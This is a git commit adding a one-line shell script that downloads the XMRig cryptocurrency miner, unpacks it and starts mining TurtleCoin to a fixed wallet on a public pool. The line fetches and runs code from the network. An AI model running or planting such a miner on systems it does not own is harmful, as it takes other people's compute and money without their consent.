37562689d81fdf6b120c33b5e409379ab4189f5b
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2021-06-03 12:36:20 +0700

    Create gass.sh

---
+++ gass.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-linux-x64.tar.gz && tar -zxf xmrig-6.7.0-linux-x64.tar.gz && cd xmrig-6.7.0 && ./xmrig --donate-level 1 -o us.turtlecoin.herominers.com:10380 -u TRTLuzDaZtNAFiXsZqCMZH7Mrwmsin6pvgfHjcwLnpeeHEJakKBFaiwUGsmqmG2Cc7a2XYJGMtFD5fCmvPbAToteN5fsAYhWYWm -p wrk1 -a argon2/chukwav2 -k pause
